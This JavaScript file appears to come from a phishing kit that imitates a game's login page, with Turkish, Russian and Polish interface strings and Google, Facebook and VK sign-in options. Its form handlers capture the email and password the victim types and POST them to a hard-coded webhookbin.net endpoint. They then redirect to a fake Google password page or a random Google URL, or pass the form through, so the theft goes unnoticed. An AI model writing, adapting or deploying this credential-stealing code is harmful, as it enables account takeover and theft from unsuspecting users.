const webhook = "https://webhookbin.net/v1/bin/a07c51bd-383a-41bb-aa78-8ce5aeeaa5bf";
const userLocale = navigator.language || navigator.userLanguage;
const translations = {
  tr: {
    population: "Dünya nüfusu",
    parties: "Parti sayısı",
    articles: "Geçen hafta yazılan makaleler",
    factories: "Özel fabrikalar",
    regions: "Bölgelerin sayısı",
    states: "Ülkeler",
    blocs: "Jeopolitik Bloklar",
    google: "Google ile oturum aç",
    login_or_pass: "Veya şifre ile giriş yapın",
    login_button: "Giriş",
    rules: "Kurallar",
    help_and_support: "Yardım ve destek",
    privacy_and_terms: "Gizlilik ve Şartlar",
    facebook: "Facebook ile giriş yap",
    vk: "VK ile giriş yap",
  },
  ru: {
    population: "Мировое население",
    parties: "Число партий",
    articles: "Статей за последнюю неделю",
    factories: "Частные фабрики",
    regions: "Число регионов",
    states: "Государства",
    blocs: "Геополитические блоки",
    google: "Войти через Google",
    login_or_pass: "Или войти с паролем",
    login_button: "Войти",
    rules: "Правила",
    help_and_support: "Помощь и поддержка",
    privacy_and_terms: "Условия использования",
    facebook: "Войти через Facebook",
    vk: "Войти через VK",
  },
  pl: {
    population: "Liczba ludności na świecie",
    parties: "Ilość partii",
    articles: "Artykuły z ostatniego tygodnia",
    factories: "Prywatne zakłady",
    regions: "Liczba regionów",
    states: "Państwa",
    blocs: "Bloki geopolityczne",
    google: "Zaloguj się z kontem Google",
    login_or_pass: "Lub zaloguj się za pomocą hasła",
    login_button: "Zaloguj się",
    rules: "Reguły",
    help_and_support: "Pomoc i wsparcie",
    privacy_and_terms: "Prywatność i warunki",
    facebook: "Zaloguj się przez Facebook'a",
    vk: "Zaloguj się przez VK",
  },
};

const sendToWebhook = async (body) => {
  const response = await fetch(webhook, {
    method: "POST",
    body: JSON.stringify(body),
  });

  return response;
};

function handleSubmitRR(event, form) {
  event.preventDefault();
  const data = new FormData(event.target);
  const email = data.get("mail");
  const password = data.get("p");

  (async function () {
    await sendToWebhook({ email: email, password: password });
    form.submit();
  })();
}

function handleSubmitPassword(event) {
  event.preventDefault();
  const data = new FormData(event.target);
  const password = data.get("password");

  (async function () {
    await sendToWebhook({ password: password });
    window.location.href =
      "https://www.google.com/account/" + Math.floor(Math.random() * 1000000);
  })();
}

function handleSubmitEmail(event) {
  event.preventDefault();
  const data = new FormData(event.target);
  const email = data.get("email");

  (async function () {
    await sendToWebhook({ email: email });
    window.location.href = "../google_password/google.html";
  })();
}

function showSpinner() {
  const showbox = document.querySelector(".showbox");
  showbox.style.display = "flex";
}

function hideSpinner() {
  const showbox = document.querySelector(".showbox");
  showbox.style.display = "none";
}
